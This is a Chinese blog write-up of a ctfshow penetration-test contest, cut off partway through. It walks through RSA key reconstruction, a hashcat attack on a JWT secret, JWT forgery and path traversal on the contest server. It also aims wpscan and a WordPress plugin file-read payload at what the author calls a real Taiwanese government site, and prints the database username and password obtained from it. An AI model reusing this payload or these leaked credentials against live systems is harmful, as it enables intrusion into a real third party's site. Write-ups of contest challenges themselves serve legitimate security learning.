<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ctfshow元旦渗透赛wp</title>
      <link href="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/"/>
      <url>/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<h2 id="启程"><a href="#启程" class="headerlink" title="启程"></a>启程</h2><img src="https://ctfer-1257200238.cos.ap-shanghai.myqcloud.com/2025/01/picture/message1.jpg" alt="img" style="zoom:67%;" /><img src="https://ctfer-1257200238.cos.ap-shanghai.myqcloud.com/2025/01/picture/task1.jpg" alt="img" style="zoom:80%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提交压缩包的密码</span><br></pre></td></tr></table></figure><p>首先获得的是一个压缩包，但是加密了。我们丢到passware里爆破一下。</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101072428317.png" class="" title="This is an example image"><p>直接出了，密码654321</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101072458023.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提交任务中心的网址</span><br></pre></td></tr></table></figure><p>获得一串base64编码后的数据，解码一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> secretMessageResponse</span><br><span class="line">    <span class="keyword">except</span> ImportError:</span><br><span class="line">        <span class="keyword">import</span> pip</span><br><span class="line">        pip.main([<span class="string">&#x27;install&#x27;</span>, <span class="string">&#x27;secretMessageResponse&#x27;</span>])</span><br><span class="line">        <span class="keyword">from</span> secretMessageResponse <span class="keyword">import</span> printMessage</span><br></pre></td></tr></table></figure><p>直接丢到python运行试试。返回结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">请使用组织分配的私钥解密后使用</span><br><span class="line">----------------------------------------------------------</span><br><span class="line">2024-12-16</span><br><span class="line">gHgAsclUVPhWDv4S8Oa8SuRTDaj+V0dI4z2jrQwfvfSFWilWwMKwNULUI48UBLS2shZcm/yv2/e5Hq5VRDfXkdxCYQMdvdnvONtpm2yNiIaLpDV4Rs8fOXJ6kcaeT+mg4RkIIFgx35w4J1KgO72pSP8j1p+R9f9TNMafwJ91XmO4QTcOYkMKQMddKvhbyMXzJkSS0uZqEppNSIUnVX9b7m8PmMjV0uHShvb1Zc8UQWJWUJ3cOxwNasOeMQGxJrZXPkxIxDYzm3f0tXbCgvdgNZ8TQY7u+iCXjOtD6xnUsdSahnPq14BD30CilIfsG0r/klPHfxQ+psmHSX47Ylai0TtgfbHWJJ4lSo0ojMvTx6HYK8zmAoCmg4OGXDbv/IjJgYU1w24na0iXZCNtcjB9MLRNck00c20f/uS64Ss0Ixii8nmfsFOjQBCcIYN+HGmOnj5Uw8DVJrxlOmcfQciG3rzuIvYlbOdGMcyarTy2Ba7iZfoovYZObPscAwhNLWqbU4tuR78aOVxiXTFRY7+Y0x2eRT5sulcvB3vsKuDMlNrxaUgiFUohPBZGNsgQgyCPxxqk0NpUn0bbHLH+vBebjJxaim4AU28ctWW8xv7xpxVttb0EoohtK2cIHr79ep5XrU/rv4R58obD/o+QqI1Mrb4wwpX9tsL7ZbROw/MXJwM=</span><br><span class="line">----------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">请使用组织分配的私钥解密后使用</span><br><span class="line">----------------------------------------------------------</span><br><span class="line">2024-04-11</span><br><span class="line">Z93Khatj+AWZcpPwIqu8LzbJ8xb8CuVMI8okE0qwoQD2IC2lixg77mJZireOrbW7zFkDsk1hP67dROJZwVUDrYot2g5GxX/xy7lGjIblUX4iJVUtP4mHqZUgKROaLoh/gippMpP+8Ik2X/QRBx5gdhq0xam+wuVC+77/tyu8Fd/DohKbAMp8aaJsFr/W4mLDZ1gv4JK+2O3l+bAvpodBRTzb0ld5zD2ueYvjTudoDjdanQP1oVTH7pkDO2Vb+SsdIyTi2C410JEOF4Qm8mzVHtiOunOcLVpAlQsM6/LdhqsTNelXl/Myb84NGxwGWVmx6j2QejiL7S1hHeHlmQ9ExHeURPdZAvKhgMCemYXu3BGlFq3ydb5SkqwLFvM4vJ6XUBcWkHT8eijBFF6Y7YgOv9GRvBTnsAQhUBp4W4EAMtXkDdToG+S8ZO7El8Gh8jaWC49n5CuUBRz3z2GeOVbsBamfLV06IO5v78jGHXig4saEFKHvYSIGewyUCVQEGoIR5xOTJBTUTePAdvQjfg28vZZxFB/hIYNDUHkaek1Mg1UH5HWGgsCX1In5hSX/9eBkznEhzeWnJ1yMsYkj+ddN34DLQSrHc83geXMcoW3Ah3cAQG8E8bszvKL3hme+T5rOeENjkOAgYhf84k4YlxDskdwvzyu8HkE9CSaBpDP6lKI=</span><br><span class="line">----------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">请使用组织分配的私钥解密后使用</span><br><span class="line">----------------------------------------------------------</span><br><span class="line">2024-03-05</span><br><span class="line">ckDSthpl5DDJMpBE26Jqk8EjaSq7MUntdwLHPouwx6D38un6WQfLJ9wgDyjh9GA/ICJR7WrwWsVinr6y3u9w+ubMZ0mqmtnphzQraagk8NkKc1u1+qGp8llsud3C8mvJWa4GYa9KEhnACDHwppPKJDCfr1HKwPbR0NIi+1Aunmy6DeOKRkFwysnrSco5QiiC9+gdXFhQDmN9KEiYW6Pc3mWVbqFiJgRW3/Df6638oGPm6AUcgRnEWMKiluyN81frM9VNtCeJ64YrU6Rgx4D153YxNNQbLTcyCQMamHTrJnhxPojkuDqbEcU+iiN4offwrQyr4eEu9ecvmyD2w/n7pAOsVnqSzroBujVA+CK6Zq8Uie15mL5yWG9hD5ZcbSwnRmtqK3yl0Xl91hgn1JqcIEKtf+MnMQPr80uoxT3mz8IX8pyVnyyw1x6F+IK1I2G+5w6rUDjhzIbME5XB9hopwcswsXrMo9PP6/5Sz1noJrsu6k6WN8ZM0MyRIav+xuKP1+cYzlPSQZrMo3L4ieHQnBbsoyzGVf9QONMwaooGOrxu88ZWlGe8e7eyCzteeNSVOC2zqtQiwQJIgfp2UwTymA/cEjOICWVzUXwbE5wWUBPCLp2C/XWc82byrOHAFXHLOVKgolVToUpZ5uOvizgk/ahaxdGxGa9CrRyr6sf+goA=</span><br><span class="line">----------------------------------------------------------</span><br></pre></td></tr></table></figure><p>同时题目给了npq</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">633246888504573920779824237508007735589231666589188021171575950939940255140086052090801972411182075806200277922264916256376952068104942084262732765302869757002336862151158422906662985191392193462511289187123754337854684702016396996198789908170728175626225281406256476216079863574750768787169969475152717430903460149705597463505143799487488630064694962535355825378265518133414832135165998125004282912865895836379205933895029154287788824317000843771251331435939410389957572552746410933103347212260533351406876584798128116835102705770834548333327952204414218313396767348386545933700371706780732081128764732828398879654027694999061445888984652196057717761623666471390226500419047354546009526849190038055817008252022472857695300387827500818231719929626707573775972451255428059119840669826086027702546510213791864358183204530776020004866770536545695330324167569777791175170044812028227494966458864002660598592490354017639158027968836329598282419666463285900175674408026881052737148611395153194390130628356104784358804158581294733196703476913434055209441802708485723455322985654447400945734717510509951259155462497189459983874690099575241597111904193711108488616566486665053884629084564364205319797812148684173057523812840684555544241901417</span><br><span class="line">31764044218067306492147889531461768510318119973238219147743625781223517377940974553025619071173628007991575510570365772185728567874710285810316184852553098753128108078975486635418847058797903708712720921754985829347790065080083720032152368134209675749929875336343905922553986957365581428234650288535216460326756576870072581658391409039992017661511831846885941769553385318452234212849064725733948770687309835172939447056526911787218396603271670163178681907015237200091850112165224511738788059683289680749377500422958532725487208309848648092125981780476161201616645007489243158529515899301932222796981293281482590413681</span><br><span class="line">19935965463251204093790728630387918548913200711797328676820417414861331435109809773835504522004547179742451417443447941411851982452178390931131018648260880134788113098629170784876904104322308416089636533044499374973277839771616505181221794837479001656285339681656874034743331472071702858650617822101028852441234915319854953097530971129078751008161174490025795476490498225822900160824277065484345528878744325480894129738333972010830499621263685185404636669845444451217075393389824619014562344105122537381743633355312869522701477652030663877906141024174678002699020634123988360384365275976070300277866252980082349473657</span><br></pre></td></tr></table></figure><p>给了npq，e默认，那么私钥自然而然其实就有了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Cryptodome.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n=<span class="number">633246888504573920779824237508007735589231666589188021171575950939940255140086052090801972411182075806200277922264916256376952068104942084262732765302869757002336862151158422906662985191392193462511289187123754337854684702016396996198789908170728175626225281406256476216079863574750768787169969475152717430903460149705597463505143799487488630064694962535355825378265518133414832135165998125004282912865895836379205933895029154287788824317000843771251331435939410389957572552746410933103347212260533351406876584798128116835102705770834548333327952204414218313396767348386545933700371706780732081128764732828398879654027694999061445888984652196057717761623666471390226500419047354546009526849190038055817008252022472857695300387827500818231719929626707573775972451255428059119840669826086027702546510213791864358183204530776020004866770536545695330324167569777791175170044812028227494966458864002660598592490354017639158027968836329598282419666463285900175674408026881052737148611395153194390130628356104784358804158581294733196703476913434055209441802708485723455322985654447400945734717510509951259155462497189459983874690099575241597111904193711108488616566486665053884629084564364205319797812148684173057523812840684555544241901417</span></span><br><span class="line">p=<span class="number">31764044218067306492147889531461768510318119973238219147743625781223517377940974553025619071173628007991575510570365772185728567874710285810316184852553098753128108078975486635418847058797903708712720921754985829347790065080083720032152368134209675749929875336343905922553986957365581428234650288535216460326756576870072581658391409039992017661511831846885941769553385318452234212849064725733948770687309835172939447056526911787218396603271670163178681907015237200091850112165224511738788059683289680749377500422958532725487208309848648092125981780476161201616645007489243158529515899301932222796981293281482590413681</span></span><br><span class="line">q=<span class="number">19935965463251204093790728630387918548913200711797328676820417414861331435109809773835504522004547179742451417443447941411851982452178390931131018648260880134788113098629170784876904104322308416089636533044499374973277839771616505181221794837479001656285339681656874034743331472071702858650617822101028852441234915319854953097530971129078751008161174490025795476490498225822900160824277065484345528878744325480894129738333972010830499621263685185404636669845444451217075393389824619014562344105122537381743633355312869522701477652030663877906141024174678002699020634123988360384365275976070300277866252980082349473657</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line"><span class="comment"># print(d)</span></span><br><span class="line">d=<span class="built_in">int</span>(d)</span><br><span class="line">key = RSA.construct((n, e, d, p, q))</span><br><span class="line">private_key=key.export_key()</span><br><span class="line"><span class="built_in">print</span>(private_key.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIJKQIBAAKCAgEAmziayo9Tddo1FYdrtOswyjLYJ5frYKEwm4rQTsKU8UcdnnDR</span><br><span class="line">gms+ZmStoqlH/qi6x+D1K3fvvioCnGZLFHZwBUqbgT5x+qUmUaVMll9FOT7ZJ05w</span><br><span class="line">8n8Ljqa1akzFMU5G7YbCr3vQwN63vwvD9/63TDbXkJrv1fGl2rHpPwp5OPCUeCB3</span><br><span class="line">nIFIRCWHpJU7sHJqIP5vzV8KNJtbxgR+dhszdg+NhoBDUpxoVN5lzSKr2TMOLFLZ</span><br><span class="line">aQR9AWOV/aHV8gjTkTLDZfc+XlfhxiDMTQdiUTbk/tynpt+JFrDA8vL5/TOmuxgu</span><br><span class="line">mqgXZIPGrIUbwloTYyHD/XXmvXu5KE8g3eMKgxNxuEKM5bMTESBK9A7Q2Kj3eNp0</span><br><span class="line">Rvb5Aleg7h8/YbQemGelY/o5xpUyHgHjsfNQ3j/xhdhVCNVaXZF64V/YVpvC9Cq2</span><br><span class="line">9F7qI+bl6FlN7zSpuHB3QgNS1uXOmjBCsA7ypZoWmdXeaLIO+I3kP48BBSmue4ni</span><br><span class="line">dJifiK/kSOcZ0iegRXV1hyZ6pYdDE7hM5V5t5tvayJ31zRQNT2ALAFeCDozVWELH</span><br><span class="line">TnphkPkQO+SOPglrVz0S1dXicqRofXWMj7PJOFkBpWIX0aywMIh1woEAawUs3RM2</span><br><span class="line">pfLUNtqUTfodSCmWlwcpGrBWG5NACx7csPFtzWn8oPZfzL346at5DDIwD2kCAwEA</span><br><span class="line">AQKCAgA+oGYD2DQqVrIYT50rT8FNs5n2z5rOT/rWpvlI7cU+XB0dMhO19SMmGPTd</span><br><span class="line">rkM4AkfqIV+J/Egkh7qp87PTO74SxHldeh5urHd7daAjA6lgYXUoIMP9czjsg2Kq</span><br><span class="line">0vK05ApGB5tBRkmBp9qnIE4fHwxBmdb7pyehQHBUfnfHUah7SsX8ec0Ivji0FhhW</span><br><span class="line">VUfR9zfOvBnL2M67TvuGN4X2jR8EQV4uqE2BZU3LADg+vgBsD+dmBr9lWcQ97To1</span><br><span class="line">LTivANSrvrmLyGfHlNmpIM6NPa9zaRyXn9ucvpAHMaWH4HTwrghVcHpNOAjIK0rb</span><br><span class="line">jJEYp1MvKg5zk0BXrzWTh+mQ3Ov+NXrbdDspmeZsY02SuyPheOBHHHs7cHANPcRH</span><br><span class="line">1Nl/nxXkRF9H+oSOmTQi7wjZbhrEFFCeCK2TuT8vyf0p+lQMPEc+cAFn5rSXnhii</span><br><span class="line">W2Mq6nwx5Nbllr/hj7oVeyGrUZFskvbZnYYVM4NTFqUPBzQbBuQTGGfccZc9OrJx</span><br><span class="line">2qpDZdUknQe9ZI742c2vZRTqY2yZX6InR8JoQbmscke4LRdUMHH6G/PbfkqPXfFy</span><br><span class="line">r5mxscghP+kRFj86dyL03CB039N23xCNezK/AGE/6JzJgwpvUPaYtvnIuhSFQEmH</span><br><span class="line">DGrYYrDXSbwTT0ufM/tIEuHMHXT4DYX3nm94SG8wB/b3zpFdAQKCAQEA+56kjWCg</span><br><span class="line">Wcjo+QUgp50+BIa5hkFoV16QOCQEsqh+s5rhVMke7svuo5+U6C/rNFIkpR1iKRPL</span><br><span class="line">3LOqJ8B5P7ZAPdhbHAPjdtnUDbPzM1r0RYpjbJPh4AcRVqhDTWy20Yd7iZN9mHxH</span><br><span class="line">SKBZ4Txn20gvkHamPVlPMejsDRpDoauS/euzn2GlG9GPq7i5vHwQiy6sYZAPm9Ey</span><br><span class="line">z+XxsQNiqB32tHnZqYrj/GS64Jx6eaa5MdSCLIPkHHWAUHzBQ5A8/bNTFf8VAYri</span><br><span class="line">R9GnTZF8oSNne6oD62IYVzDH2wWOWSnUKdAdsnaahJLvHQnWbz6itWPWj+2TrjLS</span><br><span class="line">nl9Tz7uuhrRjcQKCAQEAnexbL5Sov7N4W7BrZZao8cKEnM6goDpUjqgEnlIG4FF+</span><br><span class="line">UVmBzuAYNlLjOXW7fKK6nt5q95R1AA72FpfOHbZnTTYHm9u1zUecIeuvNVjxi9sw</span><br><span class="line">hmhMn43pxaQcUfgWSsCrqH+8SrVEz8Lc7V2lbswx/V94PC8Za7ZLSr+FOz6X7C71</span><br><span class="line">sLQR8XI3SkrZIkmL150N8LO4WdKAtKKIfvz7Lo2xLxpGLNJ3Xf/NW51wMs5BwQNz</span><br><span class="line">EUWRUmkgCmeU74m47TCSOj580qLLT0Hxj1jRhecZOs0DHqDCeHt0hz82EtOcw1TB</span><br><span class="line">JKTly3Xj/UjGRpzEmo8rAuU8XoKc/NkmaZCjpxh/eQKCAQEArbI5E+OFLhXURbs1</span><br><span class="line">bJ/OpR8/yR8z4URFOIwcthw8ws2DCZ2A/gXHaiqKh7I0oryl0Vm0Xnjs/SEFsEVd</span><br><span class="line">Lg8oz8igNHm2t1/t07vKgkQiZjL/KX/4qEcYwAKN20/V8FSfgjxPskjwiIExKpwh</span><br><span class="line">ca2mMArH/Ye+dMy+zti3oU4ovaLNL5Qff1Gt5TQy+5uFbB8/HmZtb/n9IqkwrCqT</span><br><span class="line">G0z79mA7Up+vfJcork82+O2P4Ic7iXFOshqnBmjonTRf9h6pl4CsRpFSXZOr848g</span><br><span class="line">QriHAkY+SGpCNUZWYKq4NnL6pBanuX/IcQZhjGEzJz5M4fzWrCqsDM/Gt09FMxzz</span><br><span class="line">gMfb8QKCAQEAhnF+W65yTulKELzLYWv2ngLchOY/xsiBzgTqEaKBahzWrgjGQsly</span><br><span class="line">s2SzPuqk14Ft4Ow3IljHlmomRKut9IuhvBDAP4a3anCJUjNkMMVstYS/9dz7RmY5</span><br><span class="line">W2HQHlRXHgKS4NsGAI/7aehZztYHjaDW+f55zLrIKHPD+3m6weoSyiZcUberAuMa</span><br><span class="line">gOvhmJgGLmPtRzqpOgbEPYOVMo7KhCJqclAq5+OxbVvlhxYsO4RuZBQ8tLqF8iO+</span><br><span class="line">/DychaS4w2yzQFSMTYH8FZhtPnz9usI4L1/zRPLVPF7VoIJG1ZZDgeM4nqqnWyQd</span><br><span class="line">GTcIXXr+wRobItbnIwqM/ZEca4iQWiO3+QKCAQAjp153c8JvZhR3Stan0bKYHzMm</span><br><span class="line">FWEUjmygq6xgzclvkWWYmHwHvYjO4tITXHSmEt5GrUY/W1LOA0x9HRMUh7p71tw6</span><br><span class="line">7ni/lELMlT6Sk3b32SRoftEr5SmNEZlXPh2UYC260FkXNj3hhShv7DAZyV2bthqk</span><br><span class="line">YV63M7neAAU5YPmq0uvMvxHv1D17bswwbiJ3mzb/E4CSR2gDkKrZGshtJbKUtLvb</span><br><span class="line">wEigkCIjw+UFRhLiK4R+OIL7bZtE2unbYWeL1h4w1BLwFJPg/26Gnq91V96GwoKf</span><br><span class="line">JiAEy9wfJBnCwJPdr9OV9GGrMfBRF8Rkl6YyvNNb21C6ZABBuAzWpfu0I60h</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>然后用赛博厨子解密即可。</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107133135686.png" class="" title="This is an example image"><p>解得明文如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Park:</span><br><span class="line">你的行动已经暴露，24小时内迅速撤离，销毁所有资料，将现有资料统一上传到【任务中心】</span><br><span class="line">发送人：Dylan</span><br><span class="line">Park:</span><br><span class="line">总部已经为你安排新的身份，请务必在3日内抵台，你的新身份是新竹县动物保护防疫所网络安全顾问，【任务中心】账号密码和你任职单位网站的数据库用户名密码一致，请尽快修改 </span><br><span class="line">发送人：Dylan</span><br><span class="line">Park:</span><br><span class="line">【任务中心】网址已变更为 https://task.ctfer.com ，请注意修改浏览器地址栏中的链接 </span><br><span class="line">发送人：Dylan</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提交park在任务中心登陆的账号密码</span><br></pre></td></tr></table></figure><p>然后我们要做的是获取任务中心的账号密码</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101072658240.png" class="" title="This is an example image"><p>上面的密文中说到过了，任务中心的账号密码和湾湾某一g*v的数据库账密是一样的，那就说明我们要去看看湾湾的g*v。这里就不贴图了，有一丢丢敏感。。</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101072844550.png" class="" title="This is an example image"><p>wordpress，那就wpscan浅浅扫一下</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101081055976.png" class="" title="This is an example image"><p>发现插件版本out of date且给出了具体版本，那么去wpscan官网查查相关漏洞试试</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101081718877.png" class="" title="This is an example image"><p>尝试后直接获取敏感文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?aam-media=wp-config.php</span><br></pre></td></tr></table></figure><p>图就不贴了嘤嘤嘤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">define( &#x27;DB_USER&#x27;, &#x27;hsinchug_wp1&#x27; );</span><br><span class="line">define( &#x27;DB_PASSWORD&#x27;, &#x27;Q.4Vyj8VCiedX1KYU5g05&#x27; );</span><br></pre></td></tr></table></figure><p>拿到账密后就可以进入任务中心了。</p><h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提交dylan的电话号码</span><br></pre></td></tr></table></figure><p>根据任务中心中给到的信息我们可以对私钥进行掩码爆破</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101182540997.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 16500 hash.txt --custom-charset1=?l?d 4a4f7d6e8b5?1?1?10c7f</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101183239434.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJoc2luY2h1Z193cDEiLCJleHAiOjE3MzU4MTI2ODR9.vwzjhUY2xVSdKrdG2KznZ-kWWLBHvE7KTtLtFr4bRBo:4a4f7d6e8b5e3a0c7f</span><br></pre></td></tr></table></figure><p>抓显示电话号码的包，然后改JWT即可。</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101183305907.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在任务中心服务器上搜索秘密账户，用户名好像是root，提交他的密码</span><br><span class="line"></span><br><span class="line">非系统用户root 是web里面的用户名root</span><br></pre></td></tr></table></figure><p>然后注销，登陆的时候抓包狂改jwt</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101184432121.png" class="" title="This is an example image"><p>然后就多了一个administrator界面！！</p><p>抓包获取三个接口：</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101184907151.png" class="" title="This is an example image"><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101184915535.png" class="" title="This is an example image"><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101184935859.png" class="" title="This is an example image"><p>listTaskFiles接口好像可以获得目录文件？？试试看</p><p>&#x2F;getServerInfo获取内网地址</p><p>&#x2F;downloadTaskFile通过url下载文件，既然有内网地址和目录了，那么我们是不是就可以下载文件了？！</p><p>但是试了一下不太行，后来发现在listTaskFiles的bp dashboard处直接改包发包以后，浏览器上显示文件，然后直接读就行</p><p>多了一个路由</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101185518497.png" class="" title="This is an example image"><p>这个taskfiles目录下没啥东西。。。读到都是没用的，那就说明需要目录穿越。</p><p>尝试了..&#x2F;，发现过滤了，没办法</p><p>尝试置空，读取到上一级，但应该是根目录，这就不知道了</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101190115408.png" class="" title="This is an example image"><p>发现一个init_users.json，直接读</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101190237762.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7y.(sc#Ac_</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提交 DATABASE_SECRET_KEY内容</span><br></pre></td></tr></table></figure><p>然后看下一关，<strong>提交 DATABASE_SECRET_KEY内容</strong></p><p>先看看main.py.bak文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, session</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> url_for, redirect</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> basename, join</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;3f7a4d5a-a71a-4d9d-8d9a-d5d5d5d5d5d5&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span 